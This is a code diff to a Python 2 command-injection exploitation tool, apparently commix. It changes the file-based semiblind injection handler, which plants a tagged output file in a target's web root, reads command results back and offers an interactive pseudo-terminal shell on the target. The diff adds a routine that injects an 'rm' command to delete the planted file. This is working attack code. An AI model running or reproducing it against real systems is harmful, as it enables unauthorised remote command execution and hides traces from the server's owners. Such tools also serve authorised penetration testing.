@@ -49,7 +49,11 @@ def tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method):
   else :
     sys.stdout.write("\r")
     sys.stdout.flush()
-  #return False
+
+# Delete previous shells.
+def delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE):
+  cmd = "rm " + OUTPUT_TEXTFILE
+  response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
 
 #-----------------------------------------------
 # The "file-based" injection technique handler
@@ -59,9 +63,7 @@ def fb_injection_handler(url,delay,filename,http_request_method):
   counter = 0
   vp_flag = True
   exit_loops = False
-  count_loops = 0
   no_result = True
-  not_again = True
   is_encoded= False
   stop_injection = False
   injection_type = "Semiblind-based Command Injection"
@@ -73,28 +75,11 @@ def fb_injection_handler(url,delay,filename,http_request_method):
     tmp_path = settings.TMP_PATH
 		  
   print "(*) Testing the "+ technique + "... "
-
-  # Change TAG on every request to prevent false-positive resutls.
-  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
-
-  # Check if defined "--base64" option.
-  if menu.options.base64_trick == True:
-    B64_ENC_TAG = base64.b64encode(TAG)
-    B64_DEC_TRICK = settings.B64_DEC_TRICK
-  else:
-    B64_ENC_TAG = TAG
-    B64_DEC_TRICK = ""
-    
-  # The output file for file-based injection technique.
-  OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
   
   if menu.options.srv_root_dir:
     SRV_ROOT_DIR = menu.options.srv_root_dir
   else:
     SRV_ROOT_DIR = settings.SRV_ROOT_DIR
-
-  #sys.stdout.write("(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... ")
-  #sys.stdout.flush()
 
   # Print the findings to log file.
   output_file = open(filename + ".txt", "a")
@@ -111,6 +96,21 @@ def fb_injection_handler(url,delay,filename,http_request_method):
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
 	i = i + 1
+	
+	# Change TAG on every request to prevent false-positive resutls.
+	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 
+
+	# Check if defined "--base64" option.
+	if menu.options.base64_trick == True:
+	  B64_ENC_TAG = base64.b64encode(TAG)
+	  B64_DEC_TRICK = settings.B64_DEC_TRICK
+	else:
+	  B64_ENC_TAG = TAG
+	  B64_DEC_TRICK = ""
+	  
+	# The output file for file-based injection technique.
+	OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
+	
 	# Check for bad combination of prefix and separator
 	combination = prefix + separator
 	if combination in settings.JUNK_COMBINATION:
@@ -136,7 +136,7 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 
 	  #Check if defined "--verbose" option.
 	  if menu.options.verbose:
-	    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
+	    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET + "\n")
 	    
 	  # Check if target host is vulnerable.
 	  response,vuln_parameter = fb_injector.injection_test(payload,http_request_method,url)
@@ -153,7 +153,6 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  time.sleep(delay)
 	  
 	  try:
-	    count_loops = count_loops + 1
 	    # Check if defined extra headers.
 	    request = urllib2.Request(output)
 	    headers.do_check(request)
@@ -163,17 +162,16 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    html_data = output.read()
 	    shell = re.findall(r"" + TAG + "", html_data)
 	    if len(shell) != 0 and not menu.options.verbose:
-	      if not_again == False:
-		sys.stdout.write("[ " + colors.GREEN + "SUCCEED" + colors.RESET + " ]")
-		sys.stdout.flush()
-	      not_again = True
+	      percent = colors.GREEN + "SUCCEED" + colors.RESET
+	      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
+	      sys.stdout.flush()
 	      
 	  except urllib2.HTTPError, e:
 	      if e.getcode() == 404:
 		percent = ((i*100)/total)
 		# Show an error message, after 20 failed tries.
 		# Use the "/tmp/" directory for tempfile-based technique.
-		if count_loops == 20:
+		if i == 20:
 		  print "\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write on "+ SRV_ROOT_DIR + "." + colors.RESET
 		  tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
 		  if tmp_upload in settings.CHOISE_YES:
@@ -206,12 +204,13 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	      elif e.getcode() == 403:
 		print colors.BGRED + "(x) Error: You don't have permission to access this page." + colors.RESET + "\n"
 		sys.exit(0)
-			  
-	except KeyboardInterrupt: 
+	  
+	except KeyboardInterrupt:
+	  delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
 	  raise
 	
 	except urllib2.URLError, e:
-	    #print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
+	  #print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
 	  sys.exit(0)
 	
 	except:
@@ -271,16 +270,16 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	    
 	  # Check for any enumeration options.
 	  fb_enumeration.do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,delay)
-	      
-	  # Pseudo-Terminal shell
-	  gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
-	  if gotshell in settings.CHOISE_YES:
-	    print ""
-	    print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
-	    while True:
-	      try:
+	  try:
+	    # Pseudo-Terminal shell
+	    gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
+	    if gotshell in settings.CHOISE_YES:
+	      print ""
+	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
+	      while True:
 		cmd = raw_input("Shell > ")
 		if cmd == "q":
+		  delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
 		  sys.exit(0)
 		  
 		else:
@@ -293,17 +292,18 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 		  if shell:
 		    shell = " ".join(str(p) for p in shell)
 		    print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
-
-	      except KeyboardInterrupt: 
-		print ""
-		sys.exit(0)
+	    else:
+	      delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+	      if menu.options.verbose:
+		sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
+		sys.stdout.flush()
+	      pass
 	    
-	  else:
-	    #if menu.options.verbose:
-	    sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
-	    sys.stdout.flush()
-	    pass
-	  
+	  except KeyboardInterrupt: 
+	    delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+	    print ""
+	    sys.exit(0)
+	    
   if no_result == True:
     print ""
   else :
